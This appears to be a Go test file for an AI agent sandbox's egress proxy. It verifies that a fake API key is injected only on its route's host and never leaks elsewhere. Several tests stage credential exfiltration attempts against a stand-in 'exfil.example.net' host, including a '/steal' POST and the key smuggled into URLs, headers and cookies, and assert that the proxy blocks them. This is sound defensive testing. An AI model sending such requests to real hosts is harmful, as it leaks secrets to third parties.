package proxy

import (
	"bufio"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/basalt-os/basalt-os/packages/basalt-agent/internal/allowlist"
	"github.com/basalt-os/basalt-os/packages/basalt-agent/internal/credential"
)

const realKey = "LAB-FAKE-REAL-KEY-7f3a"

// seen records the headers each test server received.
type seen struct {
	mu  sync.Mutex
	hdr []http.Header
	raw []string
}

func (s *seen) add(r *http.Request) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.hdr = append(s.hdr, r.Header.Clone())
	var b strings.Builder
	_ = r.Header.Write(&b)
	s.raw = append(s.raw, r.Host+" "+r.URL.String()+"\n"+b.String())
}

func (s *seen) all() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return strings.Join(s.raw, "\n")
}

func (s *seen) last() http.Header {
	s.mu.Lock()
	defer s.mu.Unlock()
	if len(s.hdr) == 0 {
		return nil
	}
	return s.hdr[len(s.hdr)-1]
}

func (s *seen) count() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.hdr)
}

type credLab struct {
	provider, exfil         *seen
	proxyAddr               string
	providerPort, exfilPort int
	rec                     *recorder
	release                 chan struct{}
}

// newCredLab: a TLS "provider" (httptest certificate, valid for
// example.com) behind a credential route, and a plain-HTTP "exfil" host
// that is allowed but has no route.
func newCredLab(t *testing.T, token string, routeAllowed bool) *credLab {
	lab := &credLab{provider: &seen{}, exfil: &seen{}, rec: &recorder{}, release: make(chan struct{})}
	prov := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		lab.provider.add(r)
		if r.URL.Path == "/v1/stream" {
			w.Header().Set("Content-Type", "text/event-stream")
			fmt.Fprint(w, "data: first\n\n")
			w.(http.Flusher).Flush()
			<-lab.release
			fmt.Fprint(w, "data: last\n\n")
			return
		}
		fmt.Fprintf(w, "key_ok=%v path=%s query=%s", r.Header.Get("X-Api-Key") == realKey, r.URL.Path, r.URL.RawQuery)
	}))
	t.Cleanup(prov.Close)
	ex := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		lab.exfil.add(r)
		fmt.Fprint(w, "exfil ok")
	}))
	t.Cleanup(ex.Close)
	lab.providerPort = prov.Listener.Addr().(*net.TCPAddr).Port
	lab.exfilPort = ex.Listener.Addr().(*net.TCPAddr).Port

	var entries []allowlist.Entry
	if routeAllowed {
		e, _ := allowlist.ParseEntry(fmt.Sprintf("example.com:%d private", lab.providerPort))
		entries = append(entries, e)
	}
	e, _ := allowlist.ParseEntry(fmt.Sprintf("exfil.example.net:%d private", lab.exfilPort))
	entries = append(entries, e)
	pool := x509.NewCertPool()
	pool.AddCert(prov.Certificate())
	s := &Server{List: allowlist.New(entries), Token: token, OnDecision: lab.rec.add,
		Resolve: func(_ context.Context, h string) ([]net.IP, error) { return []net.IP{net.ParseIP("127.0.0.1")}, nil },
		Routes: []credential.Route{{Name: "LAB_KEY", Host: "example.com", Port: lab.providerPort, Header: "X-Api-Key",
			Value: realKey}},
		UpstreamTLS: &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}}
	lab.proxyAddr = start(t, s)
	return lab
}

// viaProxy sends one absolute-URI request through the proxy.
func (lab *credLab) viaProxy(t *testing.T, method, target, token string, hdr map[string]string) (int, string) {
	t.Helper()
	pu, _ := url.Parse("http://" + lab.proxyAddr)
	if token != "" {
		pu.User = url.UserPassword("basalt", token)
	}
	c := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(pu)}, Timeout: 10 * time.Second}
	req, _ := http.NewRequest(method, target, strings.NewReader("{}"))
	for k, v := range hdr {
		if k == "Host" {
			req.Host = v
			continue
		}
		req.Header.Set(k, v)
	}
	resp, err := c.Do(req)
	if err != nil {
		t.Fatalf("%s: %v", target, err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

// raw sends an absolute-URI request with its own Host header, on a raw
// connection (Go's client would rewrite the request line from Host).
func (lab *credLab) raw(t *testing.T, target, host, token string) (int, string) {
	t.Helper()
	c, err := net.Dial("tcp", lab.proxyAddr)
	if err != nil {
		t.Fatal(err)
	}
	defer c.Close()
	auth := ""
	if token != "" {
		auth = "Proxy-Authorization: Basic " + base64.StdEncoding.EncodeToString([]byte("basalt:"+token)) + "\r\n"
	}
	fmt.Fprintf(c, "GET %s HTTP/1.1\r\nHost: %s\r\nX-Api-Key: %s\r\n%sConnection: close\r\n\r\n", target, host, credential.Placeholder, auth)
	resp, err := http.ReadResponse(bufio.NewReader(c), nil)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

func TestRouteInjectsOnlyOnItsHost(t *testing.T) {
	lab := newCredLab(t, "pw", true)
	agentHdr := map[string]string{"X-Api-Key": credential.Placeholder, "Authorization": "Bearer agent-junk",
		"X-Goog-Api-Key": credential.Placeholder}

	// The route's host: the agent's credential headers are replaced by the
	// real key, the request goes over TLS to the route's port.
	st, body := lab.viaProxy(t, "POST", "http://example.com/v1/messages?beta=true", "pw", agentHdr)
	if st != 200 || body != "key_ok=true path=/v1/messages query=beta=true" {
		t.Fatalf("route: %d %q", st, body)
	}
	h := lab.provider.last()
	if h.Get("Authorization") != "" || h.Get("X-Goog-Api-Key") != "" || h.Get("Proxy-Authorization") != "" {
		t.Errorf("provider got agent headers: %v", h)
	}

	// The request's Host header does not move the key elsewhere: the
	// target is the request line's host.
	if st, body := lab.raw(t, "http://example.com/x", fmt.Sprintf("exfil.example.net:%d", lab.exfilPort), "pw"); st != 200 || !strings.HasPrefix(body, "key_ok=true") {
		t.Errorf("host header: %d %q", st, body)
	}
	if lab.exfil.count() != 0 {
		t.Errorf("exfil contacted by a route request: %s", lab.exfil.all())
	}

	// Another allowed host: credential headers removed, never a key.
	st, body = lab.viaProxy(t, "POST", fmt.Sprintf("http://exfil.example.net:%d/steal", lab.exfilPort), "pw", agentHdr)
	if st != 200 || body != "exfil ok" {
		t.Fatalf("exfil: %d %q", st, body)
	}
	if h := lab.exfil.last(); h.Get("X-Api-Key") != "" || h.Get("Authorization") != "" || h.Get("X-Goog-Api-Key") != "" {
		t.Errorf("exfil got credential headers: %v", h)
	}
	// Even with the route host named in the Host header.
	if st, body := lab.raw(t, fmt.Sprintf("http://exfil.example.net:%d/h", lab.exfilPort), "example.com", "pw"); st != 200 || body != "exfil ok" {
		t.Errorf("exfil with route Host header: %d %q", st, body)
	}
	if h := lab.exfil.last(); h.Get("X-Api-Key") != "" {
		t.Errorf("exfil got a key header: %v", h)
	}

	// A request that carries the real key (it leaked some other way) is
	// refused before it leaves.
	before := lab.exfil.count()
	if st, _ := lab.viaProxy(t, "GET", fmt.Sprintf("http://exfil.example.net:%d/?k=%s", lab.exfilPort, realKey), "pw", nil); st != 403 {
		t.Errorf("key in URL: %d", st)
	}
	if st, _ := lab.viaProxy(t, "GET", fmt.Sprintf("http://exfil.example.net:%d/", lab.exfilPort), "pw",
		map[string]string{"X-Note": "a" + realKey + "b"}); st != 403 {
		t.Errorf("key in header: %d", st)
	}
	if lab.exfil.count() != before {
		t.Errorf("a request carrying the key reached the exfil host")
	}
	if strings.Contains(lab.exfil.all(), realKey) {
		t.Fatalf("THE KEY REACHED ANOTHER HOST:\n%s", lab.exfil.all())
	}

	// Without the proxy password nothing happens (native mode).
	if st, _ := lab.viaProxy(t, "GET", "http://example.com/x", "", nil); st != 407 {
		t.Errorf("no password: %d", st)
	}

	lab.rec.mu.Lock()
	defer lab.rec.mu.Unlock()
	var used, stripped int
	for _, d := range lab.rec.ds {
		if d.Credential == "LAB_KEY" && d.Allowed {
			used++
			if d.Host != "example.com" || d.Port != lab.providerPort {
				t.Errorf("credential decision %+v", d)
			}
		}
		if len(d.Stripped) > 0 {
			stripped++
		}
		if strings.Contains(fmt.Sprintf("%+v", d), realKey) {
			t.Errorf("a decision carries the key: %+v", d)
		}
	}
	if used != 2 || stripped != 2 {
		t.Errorf("decisions: %d credential uses, %d strips: %+v", used, stripped, lab.rec.ds)
	}
}

// TestRouteTunnel: Node's fetch tunnels http:// URLs with CONNECT HOST:80.
// The proxy ends such a tunnel itself for a route's host.
func TestRouteTunnel(t *testing.T) {
	lab := newCredLab(t, "", true)
	st, c := connect(t, lab.proxyAddr, "example.com:80", "")
	if st != "200" {
		t.Fatalf("CONNECT example.com:80: %s", st)
	}
	defer c.Close()
	br := bufio.NewReader(c)
	for i := 0; i < 2; i++ { // keep-alive: two requests on one tunnel
		fmt.Fprintf(c, "POST /v1/messages HTTP/1.1\r\nHost: example.com\r\nX-Api-Key: %s\r\nContent-Length: 2\r\n\r\n{}", credential.Placeholder)
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 || !strings.HasPrefix(string(b), "key_ok=true") {
			t.Fatalf("request %d in tunnel: %d %q", i, resp.StatusCode, b)
		}
	}
	// Port 80 of another host is not a route: refused by the allowlist.
	if st, _ := connect(t, lab.proxyAddr, "exfil.example.net:80", ""); !strings.HasPrefix(st, "403") {
		t.Errorf("CONNECT exfil:80: %s", st)
	}
	// The TLS port of the route's host is a plain tunnel: the proxy adds
	// nothing to what it cannot read.
	st, tc := connect(t, lab.proxyAddr, "example.com:"+strconv.Itoa(lab.providerPort), "")
	if st != "200" {
		t.Fatalf("CONNECT tls port: %s", st)
	}
	tlsc := tls.Client(tc, &tls.Config{ServerName: "example.com", InsecureSkipVerify: true}) //nolint:gosec // test peer
	fmt.Fprintf(tlsc, "GET /tls HTTP/1.1\r\nHost: example.com\r\nX-Api-Key: %s\r\nConnection: close\r\n\r\n", credential.Placeholder)
	resp, err := http.ReadResponse(bufio.NewReader(tlsc), nil)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	tlsc.Close()
	if !strings.HasPrefix(string(b), "key_ok=false") {
		t.Errorf("TLS tunnel got a key: %q", b)
	}
}

func TestRouteNeedsAllowlistAndTrustedTLS(t *testing.T) {
	// The route's host is not on the allowlist: refused, nothing sent.
	lab := newCredLab(t, "", false)
	if st, _ := lab.viaProxy(t, "GET", "http://example.com/x", "", map[string]string{"X-Api-Key": "p"}); st != 403 {
		t.Errorf("route off the allowlist: %d", st)
	}
	if lab.provider.count() != 0 {
		t.Error("provider contacted")
	}

	// A trust store that does not know the test certificate: the TLS
	// handshake fails, so the key is never sent to an unverified peer.
	// (An empty root pool, not the system store, keeps the test hermetic.)
	lab2 := newCredLab(t, "", true)
	e, _ := allowlist.ParseEntry(fmt.Sprintf("example.com:%d private", lab2.providerPort))
	s := &Server{List: allowlist.New([]allowlist.Entry{e}),
		Resolve:     func(_ context.Context, h string) ([]net.IP, error) { return []net.IP{net.ParseIP("127.0.0.1")}, nil },
		Routes:      []credential.Route{{Name: "LAB_KEY", Host: "example.com", Port: lab2.providerPort, Header: "X-Api-Key", Value: realKey}},
		UpstreamTLS: &tls.Config{RootCAs: x509.NewCertPool(), MinVersion: tls.VersionTLS12}}
	addr := start(t, s)
	lab2.proxyAddr = addr
	st, body := lab2.viaProxy(t, "GET", "http://example.com/x", "", nil)
	if st != 403 || !strings.Contains(body, "certificate") {
		t.Errorf("untrusted upstream: %d %q", st, body)
	}
	if lab2.provider.count() != 0 {
		t.Error("untrusted provider got a request")
	}
}

func TestRouteStreams(t *testing.T) {
	lab := newCredLab(t, "", true)
	c, err := net.Dial("tcp", lab.proxyAddr)
	if err != nil {
		t.Fatal(err)
	}
	defer c.Close()
	fmt.Fprint(c, "GET http://example.com/v1/stream HTTP/1.1\r\nHost: example.com\r\n\r\n")
	br := bufio.NewReader(c)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		t.Fatal(err)
	}
	// The first event arrives while the provider is still answering.
	_ = c.SetReadDeadline(time.Now().Add(5 * time.Second))
	line, err := bufio.NewReader(resp.Body).ReadString('\n')
	if err != nil || line != "data: first\n" {
		t.Fatalf("first event not streamed: %q %v", line, err)
	}
	close(lab.release)
}

func TestCarriesKeyEncodings(t *testing.T) {
	s := &Server{List: allowlist.New(nil), Routes: []credential.Route{{Name: "K", Host: "a.example", Header: "X-Api-Key", Value: realKey}}}
	s.init()
	r, _ := http.NewRequest("GET", "http://b.example/?q="+url.QueryEscape("x "+realKey), nil)
	if !s.carriesKey(r) {
		t.Error("escaped query not caught")
	}
	r, _ = http.NewRequest("GET", "http://b.example/", nil)
	r.Header.Set("Cookie", "k="+realKey)
	if !s.carriesKey(r) {
		t.Error("cookie not caught")
	}
	r, _ = http.NewRequest("GET", "http://b.example/", nil)
	r.Header.Set("X-Api-Key", base64.StdEncoding.EncodeToString([]byte("other")))
	if s.carriesKey(r) {
		t.Error("false positive")
	}
}
